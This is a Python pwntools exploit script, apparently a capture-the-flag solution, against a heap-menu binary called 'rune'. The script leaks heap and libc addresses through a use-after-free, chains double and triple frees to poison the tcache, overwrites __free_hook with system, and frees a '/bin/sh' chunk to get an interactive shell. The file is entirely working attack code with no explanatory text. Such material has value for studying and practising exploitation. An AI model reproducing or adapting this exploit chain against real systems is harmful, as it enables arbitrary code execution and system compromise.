#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")

exe = ELF("./rune")
libc = ELF("./libc.so.6")
# context.log_level='debug'
context.terminal = ["alacritty","-e"]
# p = remote("heap", 1337)
p = process([exe.path])
def gdbs():
    gdb.attach(p, gdbscript="""

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
def new(username,password):
    sla("> ", "2")
    sla("name >", username)
    sla("word >", password)
def delete(username):
    sla("> ", "3")
    sla("name >", username)
def view():
    sla(b">",b"5")
def change(user,password):
    sla(b">",b"4")
    sla(b">",user)
    sla(b">",password)



delete(b"root")
view()
p.recvuntil(b": ",drop=True)
heap = u64(p.recv(6).ljust(8,b"\0"))-0x10
log.info(f"heap: {hex(heap)}")
new(b"root",b"root")
for i in range(22):
    new(str(i+1)*3,p64(0x421))
new(b"fake1",p64(0x31))
new(b"fake2",p64(0x31))
new(b"dfree",b"dfree")
delete("dfree")
change(p8(0),b"aaaaaaa")
delete(b"\0")
tripfree = heap+0x9c0
change(p64(tripfree)[:-2],b"aaaaa")
delete(p64(tripfree)[:-2])
freeaddr = heap+0x550
new(p64(freeaddr)[:-2],p64(heap+0x10))
new("allo","allo")
new(b"large",b"large")
delete("large")
new(b"lmao",b"lmao")
# triple free
delete(p64(heap+0x550))
change(p64(heap+0x370)[:-2],b"aaaa")
delete(p64(heap+0x370))
change(p64(heap+0x550)[:-2],b"aaaa")
delete(p64(heap+0x550))
libc_place = heap+0x580
new(p64(libc_place)[:-2],p64(heap+0x10))
new(b"",b"")
new(b"",b"")
#recv libc address
delete(p64(heap+0x50a))
view()
p.recv(3)
addr = (u64(p.recvuntil(b":",drop=True).ljust(8,b"\0")))
libc.address = addr-0x1ecb0a
log.info(f"libc: {hex(libc.address)}")
new(b"root",b"root")
delete(p64(addr))
delete(b"root")
# triple free
change(p64(libc.address+0x1ecbe0)[:-2],b"aaaa")
delete(p64(libc.address+0x1ecbe0))
change(p64(heap+0x550)[:-2],b"aaaa")
delete(p64(heap+0x550))
new(p64(libc.sym.__free_hook),b"")
new(b"/bin/sh\0",b"")
new(p64(libc.sym.system)[:-2],b"")
delete(b"/bin/sh\0")
# gdbs()



p.interactive()
# good luck pwning :)

